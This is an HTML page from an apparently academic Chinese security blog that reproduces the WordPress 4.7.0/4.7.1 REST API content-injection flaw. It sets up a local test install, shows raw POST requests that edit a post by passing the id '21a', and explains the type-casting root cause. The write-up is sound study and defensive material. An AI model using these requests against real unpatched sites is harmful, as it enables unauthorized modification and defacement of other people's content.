@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>WordPress REST API内容注入漏洞复现 - 小黑屋</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="&amp;lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&amp;gt;
+&amp;lt;!-- 这里是简单的介绍，50-100字 --&amp;gt;　　WordPress REST API内容注入漏洞是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WordPress REST API内容注入漏洞复现">
+<meta property="og:url" content="http://das.scusec.org/2017/02/20/WP-content-Injection/index.html">
+<meta property="og:site_name" content="小黑屋">
+<meta property="og:description" content="&amp;lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&amp;gt;
+&amp;lt;!-- 这里是简单的介绍，50-100字 --&amp;gt;　　WordPress REST API内容注入漏洞是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/header.jpg">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/1.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/2.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/3.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/4.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/5.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/6.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/7.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/8.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/9.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/10.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/11.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/12.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/13.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/14.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/15.png">
+<meta property="og:image" content="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/17.png">
+<meta property="og:updated_time" content="2017-02-20T04:07:41.766Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WordPress REST API内容注入漏洞复现">
+<meta name="twitter:description" content="&amp;lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&amp;gt;
+&amp;lt;!-- 这里是简单的介绍，50-100字 --&amp;gt;　　WordPress REST API内容注入漏洞是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
+  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
+      <a id="logo" class="logo logo-text" href="/">小黑屋</a>
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">文档</a>
+        
+          <a class="main-nav-link" href="/categories">分类</a>
+        
+          <a class="main-nav-link" href="/tags">标签</a>
+        
+          <a class="main-nav-link" href="/links">链接</a>
+        
+          <a class="main-nav-link" href="/share">分享</a>
+        
+          <a class="main-nav-link" href="/about">关于</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://das.scusec.org"></form>
+        </div>
+      </nav>
+    </div>
+  </div>
+</header>
+    <section id="main" class="outer"><article id="post-WP-content-Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      WordPress REST API内容注入漏洞复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/02/20/WP-content-Injection/" class="article-date">
+  <time datetime="2017-02-20T04:07:41.766Z" itemprop="datePublished">2017-02-20</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/安全笔记/">安全笔记</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- 这里是文章头部的图片 大小为800px*200px左右-->
+<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/header.jpg" alt=""><br><!-- 这里是简单的介绍，50-100字 --><br>　　<br>WordPress REST API内容注入漏洞是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。</p>
+<a id="more"></a>
+<h2 id="0x01-背景介绍"><a href="#0x01-背景介绍" class="headerlink" title="0x01 背景介绍"></a>0x01 背景介绍</h2><p>　　WordPress REST API插件提供了一个与语言无关的简单而方便的json数据接口，让我们可以通过HTTP获取简单方便的JSON(JavaScript Object Notation)格式的数据：用户，文章，分类等等。</p>
+<p>　　获取或更新数据也变得非常简单，只需要发送一个HTTP请求就可以了。需要获取网站的文章？只需要发送一个GET请求到/wp-json/posts，需要更新ID为4的用户？只需要发送一个POST请求到/wp-json/users/4，搜索关键词为 “awesome”的所有文章，发送一个GET请求到/wp-json/posts?filter[s]=awesome</p>
+<p>　　在4.7.0版本后，REST API插件的功能被集成到WordPress中，WP REST API (WP API) 能让你创建、编辑获取文章（各种WordPress内置的文章类型的文章以及自定义类型的文章）、创建、编辑和获取用户等，因此，它在某些情形下需要认证 (授权)，比如创建和编辑操作，就绝对需要授权才行，否则，处理申请会被 WordPress 拒绝。此次漏洞就是由于权限控制失效导致内容注入或修改。该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。</p>
+<h2 id="0x02-本地搭建WordPress平台"><a href="#0x02-本地搭建WordPress平台" class="headerlink" title="0x02 本地搭建WordPress平台"></a>0x02 本地搭建WordPress平台</h2><p>漏洞影响WordPress版本：4.7.0和4.7.1
+　　</p>
+<p>复现环境：Wampserver(Apache2.4.23；PHP7.0.10；MySQL5.7.14)</p>
+<p>下载WordPress4.7.1版本程序包，解压到wamp安装目录下即：D;\wamp64\www.</p>
+<p>从浏览器打开（127.0.0.1/wamp64/wordpress）按提示进行设置，完成网站搭建。</p>
+<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/1.png" alt=""><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/2.png" alt=""><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/3.png" alt=""><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/4.png" alt=""></p>
+<p><strong>加载Apache的Mod_rewrite模块：</strong></p>
+<p>　　（Mod_rewrite模块包括很多工作，其中最常用的就是在网站编辑时声明规则，被Apache实时地将访问者请求的静态URL地址映射为动态查询字符串，并发送给不同的PHP脚本处理。从搜索引擎蜘蛛的角度看来，这些URL地址是静态的，也就是平时我们说的动态网站静态化。）</p>
+<p>　　一般在安装Apache时已经包含了modrewrite模块。 在Apache的安装目录的modules文件夹下查找一个文件modrewrite,如果找到的话就是已经安装了。</p>
+<p>　　一般mod_rewrite默认是不启动的，这时我们需要手动启用它。 打开Apache名为“httpd.conf”的配置文件，找到<br><code>#LoadModule rewrite_module modules/mod_rewrite.so</code>将#注释符删除，使得Apache在启动时就加载mod_rewrite模块。</p>
+<p>并且搜索找到以下代码段：<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/5.png" alt=""><br>　　将其中的：<code>AllowOverride None</code>改为<code>AllowOverride All</code>。<br>重启服务即可。</p>
+<p><strong>设置WordPress站点为固定链接：</strong></p>
+<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/6.png" alt=""></p>
+<p>　　选择非朴素类即可。</p>
+<p>　　准备工作完成。</p>
+<h2 id="0x03-漏洞复现过程"><a href="#0x03-漏洞复现过程" class="headerlink" title="0x03 漏洞复现过程"></a>0x03 漏洞复现过程</h2><p>API地址：<code>http://127.0.0.1/wordpress/wp-json</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/7.png" alt=""></p>
+<p>json编码的网页内容</p>
+<p>查看文章列表：<code>http://127.0.0.1/wordpress/wp-json/wp/v2/posts</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/8.png" alt=""></p>
+<p>根据文章列表找到每篇文章对应的ID。</p>
+<p>检索文章：<code>http://127.0.0.1/wordpress/wp-json/wp/v2/posts/21</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/9.png" alt=""></p>
+<p>修改文章：</p>
+<pre><code>POST /wordpress/wp-json/wp/v2/posts/21?id=21 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
+Content-Type: application/json
+Content-Length: 0
+{&quot;title&quot;:&quot;x x x x&quot;}
+</code></pre><p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/10.png" alt=""></p>
+<p>构造以下数据包：</p>
+<pre><code>POST /wordpress/wp-json/wp/v2/posts/21?id=21a HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0
+Content-Type: application/json
+Content-Length: 0
+{&quot;title&quot;:&quot;x x x x&quot;}
+</code></pre><p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/11.png" alt=""></p>
+<p>返回200，修改成功。</p>
+<h2 id="0x03-浅析漏洞产生原因"><a href="#0x03-浅析漏洞产生原因" class="headerlink" title="0x03 浅析漏洞产生原因"></a>0x03 浅析漏洞产生原因</h2><p>HTTP客户端可以对资源执行的操作类型：HEAD、GET、POST、PUT、DELETE</p>
+<p>检索文章：<code>http://127.0.0.1/wordpress/wp-json/wp/v2/posts/21</code><br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/12.png" alt=""></p>
+<p>　　● 路由（route）是wp/v2/posts/21，不包括wp-json，因为wp-json是API本身的基本路径。</p>
+<p>在文件./wp-includes/rest-api/endpoints/class-wp-rest-post-controller.php中<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/13.png" alt=""></p>
+<p>　　注册的路由用来数字填充id请求参数，比如上面这个wp-json/wp/v2/posts/21，就是将id参数设置为21。并且其中对路由进行了正则限制，防止攻击者恶意构造id值。但是查看rest-api管理访问的时候，又发现$_GET和$_POST的值的优先级高于路由的正则表达式。这样的话，攻击者就可以发送wp-json/wp/v2/posts/21a的请求，rest-api也就会把21a分配为id参数，这样id值中就不仅仅包涵数字了。</p>
+<p>继续发现update_item_permissions_check()<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/14.png" alt=""></p>
+<p>　　它将字母数字ID直接传送给了get_post函数，这个函数通过检查帖子是否实际存在以及用户是否有权编辑此帖来验证请求。如果我们发送一个没有相应帖子的ID，我们可以通过权限检查，并被允许继续执行对update_item方法的请求。</p>
+<p>这样的id参数需要满足两个条件：</p>
+<ul>
+<li>1、使得get_post()函数找不到对应的文章</li>
+<li>2、使得update_item ()函数能找到对应的文章</li>
+</ul>
+<p>又发现使用wp-posts中的get-instance（）静态方法来抓取帖子，<br><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/15.png" alt=""></p>
+<p>　　可以看出，对于不是由纯数字组成的任何输入，其基本上会失败 。<br>这意味着WordPress（将其视作具有足够权限编辑此帖的用户）会运行update_item方法。<br>而update_item方法的作用是：WordPress在向get-post传参之前会将ID参数转换为一个整数。又因为PHP进行类型转换的方式，进而导致了将21a转换成21。</p>
+<p><strong>漏洞产生的逻辑过程</strong></p>
+<p><img src="http://dassec.b0.upaiyun.com/zhgchg/WP-content-Injection/17.png" alt=""></p>
+<p>参考链接：<br><a href="http://www.freebuf.com/vuls/126734.html" target="_blank" rel="external">新曝WordPress REST API内容注入漏洞详解</a>　<a href="https://www.seebug.org/vuldb/ssvid-92637" target="_blank" rel="external">WordPress REST API 内容注入漏洞</a></p>
+
+      
+    </div>
+    
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/张成/">张成</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/02/11/【文献阅读】A Canonical Password Strength Measure/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">【文献阅读】A Canonical Password Strength Measure&nbsp;<span>&gt;</span></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+  
+  <section id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-WP-content-Injection" data-title="WordPress REST API内容注入漏洞复现" data-url="http://das.scusec.org/2017/02/20/WP-content-Injection/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:'dassec'};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+      </script>
+    <!-- 多说公共JS代码 end -->
+  </section>
+  </section>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 das&nbsp;
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, theme by <a href="http://github.com/ppoffice">PPOffice</a>，<a href="http://das.scusec.org/atom.xml">RSS</a>
+    </div>
+  </div>
+</footer>
+    
+
+<script src="/js/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+  </div>
+</body>
+</html>
